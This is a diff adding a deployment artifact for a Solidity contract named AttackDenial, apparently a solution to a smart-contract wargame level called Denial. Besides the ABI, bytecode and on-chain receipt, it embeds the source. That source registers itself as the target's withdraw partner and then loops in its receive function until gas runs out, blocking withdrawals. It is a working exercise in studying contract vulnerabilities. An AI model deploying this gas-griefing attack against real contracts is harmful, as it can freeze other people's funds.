@@ -1,0 +1,131 @@
+{
+  "address": "0x74Fd98dE45e37A9AF6e2dB4a2772B3e6445d6eC1",
+  "abi": [
+    {
+      "inputs": [
+        {
+          "internalType": "contract IDenial",
+          "name": "_target",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "payable",
+      "type": "constructor"
+    },
+    {
+      "inputs": [],
+      "name": "setWithdrawPartner",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "target",
+      "outputs": [
+        {
+          "internalType": "contract IDenial",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "withdraw",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "stateMutability": "payable",
+      "type": "receive"
+    }
+  ],
+  "transactionHash": "0xe42c6046f0685a78560c3826bb7aa1e0b93f60f6a1cfc054271b8f42e0236463",
+  "receipt": {
+    "to": null,
+    "from": "0x482577148a64CF20f4a62F14A2455dC0A79478c7",
+    "contractAddress": "0x74Fd98dE45e37A9AF6e2dB4a2772B3e6445d6eC1",
+    "transactionIndex": 2,
+    "gasUsed": "167480",
+    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000008000002000000000000000000000000000000000000080000000020000800000000000000000040100000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000400000000000000000000000000200001000000000000000000000000000000000000000000000040000100004000000000000000000001000000000000000000000000800000108000000000000000000000000000000000000000000000000000002000000000000000100000",
+    "blockHash": "0x79fa62b938ead6b8bbbca7c94c25ff46f702082d9a64264c6e6b3dcba18960bf",
+    "transactionHash": "0xe42c6046f0685a78560c3826bb7aa1e0b93f60f6a1cfc054271b8f42e0236463",
+    "logs": [
+      {
+        "transactionIndex": 2,
+        "blockNumber": 41476541,
+        "transactionHash": "0xe42c6046f0685a78560c3826bb7aa1e0b93f60f6a1cfc054271b8f42e0236463",
+        "address": "0x0000000000000000000000000000000000001010",
+        "topics": [
+          "0xe6497e3ee548a3372136af2fcb0696db31fc6cf20260707645068bd3fe97f3c4",
+          "0x0000000000000000000000000000000000000000000000000000000000001010",
+          "0x000000000000000000000000482577148a64cf20f4a62f14a2455dc0a79478c7",
+          "0x00000000000000000000000074fd98de45e37a9af6e2db4a2772b3e6445d6ec1"
+        ],
+        "data": "0x00000000000000000000000000000000000000000000000000005af3107a40000000000000000000000000000000000000000000000000001784de467bd77e160000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000178483536b5d3e1600000000000000000000000000000000000000000000000000005af3107a4000",
+        "logIndex": 10,
+        "blockHash": "0x79fa62b938ead6b8bbbca7c94c25ff46f702082d9a64264c6e6b3dcba18960bf"
+      },
+      {
+        "transactionIndex": 2,
+        "blockNumber": 41476541,
+        "transactionHash": "0xe42c6046f0685a78560c3826bb7aa1e0b93f60f6a1cfc054271b8f42e0236463",
+        "address": "0x0000000000000000000000000000000000001010",
+        "topics": [
+          "0x4dfe1bbbcf077ddc3e01291eea2d5c70c2b422b415d95645b9adcfd678cb1d63",
+          "0x0000000000000000000000000000000000000000000000000000000000001010",
+          "0x000000000000000000000000482577148a64cf20f4a62f14a2455dc0a79478c7",
+          "0x000000000000000000000000c275dc8be39f50d12f66b6a63629c39da5bae5bd"
+        ],
+        "data": "0x0000000000000000000000000000000000000000000000000001f7861e0d21c00000000000000000000000000000000000000000000000001786d5cc9a0af51e00000000000000000000000000000000000000000000134a2162294ec261d9ad0000000000000000000000000000000000000000000000001784de467bfdd35e00000000000000000000000000000000000000000000134a216420d4e06efb6d",
+        "logIndex": 11,
+        "blockHash": "0x79fa62b938ead6b8bbbca7c94c25ff46f702082d9a64264c6e6b3dcba18960bf"
+      }
+    ],
+    "blockNumber": 41476541,
+    "cumulativeGasUsed": "600362",
+    "status": 1,
+    "byzantium": true
+  },
+  "args": [
+    "0x6Ca2A9dcFEaF64d7A8d871479930a58139a22DDE"
+  ],
+  "numDeployments": 1,
+  "solcInputHash": "d9ecd1d77b3a06d6f842cf415119ecbf",
+  "metadata": "{\"compiler\":{\"version\":\"0.8.18+commit.87f61d96\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract IDenial\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"setWithdrawPartner\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"contract IDenial\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/Denial/AttackDenial.sol\":\"AttackDenial\"},\"evmVersion\":\"paris\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/Denial/AttackDenial.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ninterface IDenial {\\n    function setWithdrawPartner(address _partner) external;\\n    function withdraw() external;\\n}\\n\\ncontract AttackDenial {\\n    IDenial public target;\\n\\n    constructor(IDenial _target) payable {\\n        target = _target;\\n    }\\n\\n    // Main function to execute the attack\\n    function setWithdrawPartner() external {\\n        // Set this contract as the withdrawal partner on the target contract\\n        target.setWithdrawPartner(address(this));\\n    }\\n\\n    function withdraw() external {\\n        target.withdraw();\\n    }\\n\\n    // Function to receive Ether: we immediately revert to deny the operation\\n    receive() external payable {\\n        while(address(target).balance > 0 && gasleft() > 0){}\\n    }\\n}\\n\",\"keccak256\":\"0x0dc8a7acaff9d4fccf7f6c3d6ef089b91d63c62b7b7fe26c54b7859ffbe39999\",\"license\":\"MIT\"}},\"version\":1}",
+  "bytecode": "0x608060405260405161022738038061022783398101604081905261002291610047565b600080546001600160a01b0319166001600160a01b0392909216919091179055610077565b60006020828403121561005957600080fd5b81516001600160a01b038116811461007057600080fd5b9392505050565b6101a1806100866000396000f3fe6080604052600436106100385760003560e01c80633ccfd60b146100655780639e0855fd1461007a578063d4b839921461008f57600080fd5b36610060575b6000546001600160a01b03163115801590610059575060005a115b61003e575b005b600080fd5b34801561007157600080fd5b5061005e6100cb565b34801561008657600080fd5b5061005e610126565b34801561009b57600080fd5b506000546100af906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561010c57600080fd5b505af1158015610120573d6000803e3d6000fd5b50505050565b600054604051631387164560e21b81523060048201526001600160a01b0390911690634e1c591490602401600060405180830381600087803b15801561010c57600080fdfea2646970667358221220e70676f1500029e17dda2dfb437ef641675dac41d52af1f4d6c7d4228296a04164736f6c63430008120033",
+  "deployedBytecode": "0x6080604052600436106100385760003560e01c80633ccfd60b146100655780639e0855fd1461007a578063d4b839921461008f57600080fd5b36610060575b6000546001600160a01b03163115801590610059575060005a115b61003e575b005b600080fd5b34801561007157600080fd5b5061005e6100cb565b34801561008657600080fd5b5061005e610126565b34801561009b57600080fd5b506000546100af906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b6000805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b15801561010c57600080fd5b505af1158015610120573d6000803e3d6000fd5b50505050565b600054604051631387164560e21b81523060048201526001600160a01b0390911690634e1c591490602401600060405180830381600087803b15801561010c57600080fdfea2646970667358221220e70676f1500029e17dda2dfb437ef641675dac41d52af1f4d6c7d4228296a04164736f6c63430008120033",
+  "devdoc": {
+    "kind": "dev",
+    "methods": {},
+    "version": 1
+  },
+  "userdoc": {
+    "kind": "user",
+    "methods": {},
+    "version": 1
+  },
+  "storageLayout": {
+    "storage": [
+      {
+        "astId": 13,
+        "contract": "contracts/Denial/AttackDenial.sol:AttackDenial",
+        "label": "target",
+        "offset": 0,
+        "slot": "0",
+        "type": "t_contract(IDenial)10"
+      }
+    ],
+    "types": {
+      "t_contract(IDenial)10": {
+        "encoding": "inplace",
+        "label": "contract IDenial",
+        "numberOfBytes": "20"
+      }
+    }
+  }
+}
